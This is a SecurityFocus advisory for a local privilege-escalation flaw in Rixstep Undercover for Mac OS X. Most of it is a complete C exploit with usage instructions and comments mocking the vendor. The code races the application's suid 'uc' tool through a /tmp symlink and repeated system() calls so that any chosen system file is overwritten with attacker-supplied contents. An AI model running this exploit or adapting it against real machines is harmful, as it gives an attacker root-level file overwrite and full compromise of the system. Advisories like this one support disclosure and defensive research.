source: http://www.securityfocus.com/bid/22071/info

Rixstep Undercover is prone to a local privilege-escalation vulnerability because of a design error in the affected application.

An attacker can exploit this issue to execute arbitrary code with superuser privileges, completely compromising affected computers. Failed exploit attempts will result in a denial of service. 

/*
 * ==== Comments from rixstep_pwnage.c ====
 * "It may not come as a shocker, but so far the Month of Rixstep Bugs has not netted a single bug."
 * -- http://rixstep.com/1/20070115,00.shtml
 *
 * Maybe because nobody was looking?
 * Here's a nice little exploit to overwrite any file on the system courtesy of
 * Rixstep.
 *
 * Just run Undercover <ftp://rixstep.com/pub/Undercover.tar.bz2> once as an
 * administrator to create that nice little suid-tool.
 * Then run this app giving the path to the uc tool (Undercover.app/Contents/Resources/uc)
 * a file you want to overwrite, and the file the data to overwrite with is
 * located at.
 *
 * The pwnies aren't just for everyone else Rixstep.
 *
 * ==== More information for rixstep_pwnage_v2.c ====
 * It seems Rixstep thought they could fix their stupidity:
 * http://www.rixstep.com/1/1/20070115,02.shtml
 *
 * Silent security updates aren't cool.
 *
 * Unfortunately their bug fix was useless, maybe they forgot to actually do any
 * QA on it in their rush to say how fast they are at fixing exploits. Or maybe
 * they just don't have a clue.
 *
 * And for the record Rixstep: I am not from Unsanity, I have not worked for
 * Unsanity, I do not own any Unsanity products. I just think that you need to
 * calm down on your "fanboy" pronouncements.
 *
 * Oh and if you really wanted to give me a "free" license, feel free to contact
 * me at my evil data-mining gmail account. You told me not to contact you
 * (http://www.rixstep.com/0/contact.shtml) after all.
 *
 * Same instructions as before folks. This version is written for
 * Undercover.tar.bz2 with an MD5 of a30aa6239181928953527c9579a56471.
 *
 * Enjoy the pwnies.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main (int argc, char *argv[])
{ 
    pid_t pid;
    char *overwrite_cmd, *uc_cmd;
    if(argc != 4) { 
        fprintf(stderr, "rixstep_pwnage.c\n");
        fprintf(stderr, "Usage: %s <uc tool path> <file to overwrite> <source file>\n", argv[0]);
        return 1;
    }
    
    asprintf(&overwrite_cmd, "/bin/cat %s > %s", argv[3], argv[2]);
    asprintf(&uc_cmd, "%s + /tmp/rixstep_pwnies", argv[1]);
    
    symlink(argv[2], "/tmp/.hidden");
    system("/usr/bin/touch /tmp/rixstep_pwnies");
    
    pid = fork();
    if(pid == 0)
    {
        for (;;) {
            system(overwrite_cmd);
        }
    }
    if(pid > 0)
    {
        for (;;) {
            system(uc_cmd);
        }
    }
}